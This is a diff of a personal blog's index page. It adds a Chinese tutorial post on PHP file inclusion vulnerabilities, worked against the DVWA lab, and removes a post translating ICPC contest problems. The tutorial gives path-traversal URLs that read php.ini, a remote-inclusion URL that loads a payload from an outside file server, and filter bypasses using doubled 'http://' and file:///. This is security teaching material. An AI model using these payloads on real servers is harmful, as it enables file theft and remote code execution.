@@ -160,6 +160,116 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://wuyuesong.github.io/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wys的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">文件包含漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-03-17 15:57:27" itemprop="dateCreated datePublished" datetime="2022-03-17T15:57:27+08:00">2022-03-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-03-19 10:44:27" itemprop="dateModified" datetime="2022-03-19T10:44:27+08:00">2022-03-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数<strong>（include()，require()和include_once()，require_once()）</strong>利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
+<h2 id="低等级"><a href="#低等级" class="headerlink" title="低等级"></a>低等级</h2><ol>
+<li>在网页上，服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</li>
+</ol>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317213618855.png" alt></p>
+<p>可以看到依次点击可以返回<code>file1.php</code>、<code>file2.php</code>、<code>file3.php</code> 的内容</p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215051380.png" alt></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215106647.png" alt></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215122724.png" alt></p>
+<p>随便输入一个文件名</p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215230874.png" alt></p>
+<p>报错，页面显示错误信息，没有这个文件（因为不是系统），但是暴露了服务器文件的绝对路径，于是根据经验找到了一些有趣的东西</p>
+<p>构造绝对路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.1*.*/dvwa/vulnerabilities/fi/?page=E:\software\phpstudy_pro\WWW\DVWA\php.ini</span><br></pre></td></tr></table></figure>
+<p>构造相对路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.1*.*/dvwa/vulnerabilities/fi/?page=..\..\..\..\..\software\phpstudy_pro\WWW\DVWA\php.ini</span><br></pre></td></tr></table></figure>
+<p>可以得到文件的内容：</p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215412124.png" alt></p>
+<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>在服务器的php配置中，当选项allow_url_fopen与allow_url_include为开启状态 时，服务器会允许包含远程远程服务器上的文件，如果对文件来源没有检查， 就会导致 任意远程代码执行，还记得前面的这句话：服务器包含文件时，不管文件后缀是否是 php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
+<p>我们新建一个txt文件，输入以下内容：</p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220328003.png" alt></p>
+<p>我们用python创建一个文件服务器</p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220304856.png" alt></p>
+<p>可以看到我们成功创建了一个文件服务器并上传了一个文件：</p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220358559.png" alt></p>
+<p>我们通过输入url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.*.*/dvwa/vulnerabilities/fi/?page=http://10.19.*.*:8000/poc.txt</span><br></pre></td></tr></table></figure>
+<p>可以成功的得到php的信息</p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220913282.png" alt></p>
+<h3 id="中等级"><a href="#中等级" class="headerlink" title="中等级"></a>中等级</h3><p>1.查看代码可知，Medium级别的代码增加了str_replace函数，对page参数进行了一定的 处理，将”http:// ”、”<a target="_blank" rel="noopener" href="https://”、">https://”、</a> ” ../”、”..\”替换为空字符，即删除，对于相对路径包含 以及远程文件包含有一定的防御作用。</p>
+<p>2.文件包含的限制绕过<br>使用str_replace函数是极其不安全的，因为可以使用双写绕过规则，比如像下面这样~~page=ht<a target="_blank" rel="noopener" href="http://tp://106.13.129.216:8000/phpinfo.txt但str_replace函数会将中间的http：//删除，于是就只剩下http://106.13.129.216:8000/phpinfo.txt，相对路径也可以通过类似方法绕过，同时，相对路径不在防御范围内，所以还是可以直接用。">http://tp://106.13.129.216:8000/phpinfo.txt但str_replace函数会将中间的http：//删除，于是就只剩下http://106.13.129.216:8000/phpinfo.txt，相对路径也可以通过类似方法绕过，同时，相对路径不在防御范围内，所以还是可以直接用。</a></p>
+<p>通过大小写也可以绕过。</p>
+<p>相对路径可以通过以下方式绕过。</p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317221636399.png" alt></p>
+<h2 id="高等级"><a href="#高等级" class="headerlink" title="高等级"></a>高等级</h2><p>1.可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。 </p>
+<p>2.漏洞利用<br>    High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以 利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个 本地文件时，用的就是file协议。</p>
+<p>我们在前面加上file:///就可以打开文件</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://wuyuesong.github.io/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1019,168 +1129,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://wuyuesong.github.io/2021/10/01/XCPC/%E7%BF%BB%E8%AF%91/%E7%BF%BB%E8%AF%91/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wys的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/10/01/XCPC/%E7%BF%BB%E8%AF%91/%E7%BF%BB%E8%AF%91/" class="post-title-link" itemprop="url">翻译</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-10-01 22:24:06" itemprop="dateCreated datePublished" datetime="2021-10-01T22:24:06+08:00">2021-10-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-16 21:35:08" itemprop="dateModified" datetime="2022-03-16T21:35:08+08:00">2022-03-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/XCPC/" itemprop="url" rel="index"><span itemprop="name">XCPC</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <blockquote>
-<p>前言</p>
-<p>作为本队的计算几何选手和翻译，为了找到学校训练题目中的计算几何题目，特意通过本专栏对学校训练题进行翻译。</p>
-</blockquote>
-<h4 id="SDKD-2021-Summer-Training-Series-A-2nd-Round"><a href="#SDKD-2021-Summer-Training-Series-A-2nd-Round" class="headerlink" title="SDKD 2021 Summer Training Series A 2nd Round"></a>SDKD 2021 Summer Training Series A 2nd Round</h4><blockquote>
-<p>2019-2020 ICPC Northwestern European Regional Programming Contest (NWERC 2019)</p>
-</blockquote>
-<h5 id="A-Average-Rank"><a href="#A-Average-Rank" class="headerlink" title="A - Average Rank"></a><a target="_blank" rel="noopener" href="https://vjudge.ppsucxtt.cn/problem/Gym-102500A">A - Average Rank</a></h5><p> 在一个比赛中，每周完成的人可以得到一个点数，在每周的末尾，会对每个人的到的点数进行排名。每个人的排名为分数大于他的人数$+1$ , 如果两个人得到的点数相同那么他们的名次相同。</p>
-<p><img src="/2021/10/01/XCPC/%E7%BF%BB%E8%AF%91/%E7%BF%BB%E8%AF%91/21dfad4dca68e82d048f45957c56a4d5.png" alt></p>
-<p>一共有n名参赛选手，比赛进行w周，每周给你一个选手的得分列表，你的任务是计算n名选手在这w周的平均名次。</p>
-<p><strong>输入</strong></p>
-<p>第一行n,w，分别表示人数和周数。</p>
-<p>接下来w行，第 $i$ 行开头为 $k$，接下来k个数字$c_1,…c_k$表示$c_1,…,c_k$名选手在第 $i$ 周得到一分。</p>
-<p>所有选手的总共得分不超过 $1 million$。</p>
-<p><strong>输出</strong></p>
-<p>$n$行，第$i$行表示第$i$名选手的平均名次。</p>
-<h5 id="B-Balanced-Cut"><a href="#B-Balanced-Cut" class="headerlink" title="B - Balanced Cut"></a><a target="_blank" rel="noopener" href="https://vjudge.ppsucxtt.cn/problem/Gym-102500B">B - Balanced Cut</a></h5><p> 给你一棵 $n$ 个结点的平衡二叉搜索树，该树具有如下性质：</p>
-<ul>
-<li>左右子树深度之差不超过1。</li>
-<li>结点的值比左子树中所有结点的值都大，比右子树所有结点的值都小。</li>
-</ul>
-<p><img src="/2021/10/01/XCPC/%E7%BF%BB%E8%AF%91/%E7%BF%BB%E8%AF%91/dad71005c19df40439a95333e4e1b050.png" alt></p>
-<p>现在让你删除结点至只剩 $k$ 个结点，当你删除结点时，所有该节点的子孙结点将被删除。</p>
-<p>先让你完成这个操作，使剩余结点的中序遍历字典序最小。</p>
-<p><strong>输入</strong></p>
-<p>$n,k$ 表示有$n$个结点，要求剩余$k$个结点。</p>
-<p>接下来 $n$ 行，第$i$行为 $p_i$ ,表示值为 $i$ 的结点的父亲的值为$p_i$,  $p_i$ 为 $-1$ 表示为根节点。</p>
-<p><strong>输出</strong></p>
-<p>一个字符串，第 $i$ 位为$0$表示删除，为 $1$ 表示保留。</p>
-<h5 id="D-Disposable-Switches"><a href="#D-Disposable-Switches" class="headerlink" title="D - Disposable Switches"></a><a target="_blank" rel="noopener" href="https://vjudge.net/problem/Gym-102500D">D - Disposable Switches</a></h5><p> 给一个 $n$ 个结点，$m$ 条路径的无向图，表示一个网络。每根传输时间为 $l/v + c$ , $l$ 为电缆的长度，$v$ 为传输速率，$c$ 为常量，$v$ 和 $c$ 未知 ，只知道$v &gt; 0$ , $c &gt;= 0$ ，当一个数据传送到一个结点时，他会选择路径耗时最短的结点进行转发，求无论 $v$,$c$ 为何值时，从$1$发送数据到$n$，有哪些结点是永远不会被转发到的。</p>
-<p><strong>输入</strong></p>
-<p>$n$,$m$ ,表示有 $n$ 个结点，$m$ 条路径。接下来 $m$ 行，每行有三个数 $a$ , $b$ , $l$ ,表示 $a$ 到 $b$ 之间的电缆长度为 $l$。</p>
-<p>无重边，自环。图保证联通。</p>
-<p><strong>输出</strong></p>
-<p> 第一行为一个 $k$ ,第二行有$k$个数，表示有$k$ 个结点不会被转发到。输出按升序排列。</p>
-<h4 id="SDKD-2021-Autumn-Training-Series-B-1st-Round"><a href="#SDKD-2021-Autumn-Training-Series-B-1st-Round" class="headerlink" title="SDKD 2021 Autumn Training Series B 1st Round"></a>SDKD 2021 Autumn Training Series B 1st Round</h4><blockquote>
-<p>2018 German Collegiate Programming Contest (GCPC 18)</p>
-</blockquote>
-<h5 id="A-Attack-on-Alpha-Zet"><a href="#A-Attack-on-Alpha-Zet" class="headerlink" title="A - Attack on Alpha-Zet"></a><a target="_blank" rel="noopener" href="https://vjudge.ppsucxtt.cn/problem/Gym-102021A">A - Attack on Alpha-Zet</a></h5><p> 给你一个二维网格平面，每格是一个 $1 \times 1$ 的单元格，每个单元格至少有一个和他相邻的单元格，单元格两两之间存在路径，并且不存在环。在这个二维平面中依次访问 $n$ 个点，求最少走过的单元格。</p>
-<p><img src="/2021/10/01/XCPC/%E7%BF%BB%E8%AF%91/%E7%BF%BB%E8%AF%91/image-20211002130640240.png" alt></p>
-<p><strong>输入</strong></p>
-<p>第一行为 $h,w (2\leq h,w\leq 1000)$ 。表示迷宫的高和宽。</p>
-<p>接下来 $h+1$ 行用$ASCII$表示一个迷宫，每行有$2 \cdot w+1$ 个字符。规则如下：</p>
-<ul>
-<li>奇数行表示一个竖墙或者空格。偶数行表示一个横墙或者空格。</li>
-<li>第一行为最北边的墙，只由横线构成，接下来的行都表示单元格。</li>
-<li>单元格都在偶数列，左右为竖墙，如果没有竖墙则用空格代替。</li>
-</ul>
-<p>接下来一行是一个数字 $m$ 。</p>
-<p>接下来 $m$ 行，第 $i$ 行表示第 $i$ 要到达的点。每个坐标可能出现多次。$(1,1)$ 为左上角的点  $(h,w)$ 为右下角的点。</p>
-<p>保证迷宫是封闭的，且两个点之间只有一条路径。</p>
-<p><strong>输出</strong></p>
-<p>一个数字，表示要走过的单元格。</p>
-<p><img src="/2021/10/01/XCPC/%E7%BF%BB%E8%AF%91/%E7%BF%BB%E8%AF%91/image-20211002133323113.png" alt></p>
-<h5 id="B-Battle-Royale"><a href="#B-Battle-Royale" class="headerlink" title="B - Battle Royale"></a><a target="_blank" rel="noopener" href="https://vjudge.ppsucxtt.cn/problem/Gym-102021B">B - Battle Royale</a></h5><p>给你个蓝色圆，和一个红色圆 。问从$A$ 走到 $B$ 最短路径。</p>
-<p><strong>输入</strong></p>
-<p>$a$ 点坐标，$b$ 点坐标，蓝圆圆心坐标和半径，红圆坐标与半径。</p>
-<p>$a$,  $b$ 点保证在蓝圆内，红圆外。</p>
-<p><strong>输出</strong></p>
-<p>最短路径，误差不超过 $10^{-7}$ 。</p>
-<h5 id="C-Coolest-Ski-Route"><a href="#C-Coolest-Ski-Route" class="headerlink" title="C - Coolest Ski Route"></a><a target="_blank" rel="noopener" href="https://vjudge.ppsucxtt.cn/problem/Gym-102021C">C - Coolest Ski Route</a></h5><p> 给一个有向图，让你求一条权值最大的路径。</p>
-<p><strong>输入</strong></p>
-<p>$n,m$ 表示有 $n$ $(2 \leq n \leq 1000) $个点 ， $m$ $(1 \leq m \leq 5000)$条边。</p>
-<p>接下来 $m$ 行，每行分别为 $s,t,c(1\leq s,t \leq n,1 \leq c \leq 100)$ ,分别表示起点终点和权值。</p>
-<p>输入保证没有回路。</p>
-<p><strong>输出</strong></p>
-<p>一个整数，表示最长路径。</p>
-<h5 id="D-Down-the-Pyramid"><a href="#D-Down-the-Pyramid" class="headerlink" title="D - Down the Pyramid"></a><a target="_blank" rel="noopener" href="https://vjudge.ppsucxtt.cn/problem/Gym-102021D">D - Down the Pyramid</a></h5><p> 一个金子塔形状的图案，相邻的两个单元格相加为上层单元格数值，现告诉你 $n$ 层的序列，让你求 $n+1$ 层有几种可能。</p>
-<p><img src="/2021/10/01/XCPC/%E7%BF%BB%E8%AF%91/%E7%BF%BB%E8%AF%91/image-20211002141909709.png" alt></p>
-<p><strong>输入</strong></p>
-<p>$n(1 \leq n \leq 10^6)$ </p>
-<p>$n$ 个数表示这个序列。</p>
-<p><strong>输出</strong></p>
-<p>一个数字，表示下一行有几种可能。</p>
-<h5 id="E-Expired-License"><a href="#E-Expired-License" class="headerlink" title="E - Expired License"></a><a target="_blank" rel="noopener" href="https://vjudge.ppsucxtt.cn/problem/Gym-102021E">E - Expired License</a></h5><p> 给你 $a,b$ 问你能否找到两个素数$p,q$，使得 $\frac{p}{q} = \frac{a}{b}$。</p>
-<p> <strong>输入</strong></p>
-<p>$n(1 \leq n \leq10^5)$ </p>
-<p>接下来 $n$ 行，每行有一个$a,b(0 &lt; a,b &lt; 100)$ 。小数点后最多五位小数。</p>
-<p><strong>输出</strong></p>
-<p>满足条件的 $p,q$，如果不存在输出$impossible$ ，如果有多组解，输出 $p+q$ 最小的情况。</p>
-<h5 id="F-Fighting-Monsters"><a href="#F-Fighting-Monsters" class="headerlink" title="F - Fighting Monsters"></a><a target="_blank" rel="noopener" href="https://vjudge.ppsucxtt.cn/problem/Gym-102021F">F - Fighting Monsters</a></h5><p> 两个怪物互相攻击，，每个怪物有一个血量，当怪物 $A$ 攻击怪物 $B$ 时，会对$B$造成$A$血量的伤害。</p>
-<p>攻击过程如下图所示：</p>
-<p><img src="/2021/10/01/XCPC/%E7%BF%BB%E8%AF%91/%E7%BF%BB%E8%AF%91/image-20211002151506690.png" alt></p>
-<p>现在给你 $n$ 个怪物，问你能不能找到两个怪物，互相攻击使其中一个血量只剩下$1$点。</p>
-<p><strong>输入</strong></p>
-<p>$n(2 \leq n \leq 10^5)$</p>
-<p>第二行为$n$个数，表示$n$个怪物的血量。</p>
-<p><strong>输出</strong></p>
-<p>两个怪物的下表$i,j$，如果不存在输出$impossible$。如果存在多个，输出任意。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1250,14 +1198,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">58</span>
+          <span class="site-state-item-count">59</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">15</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
   </nav>
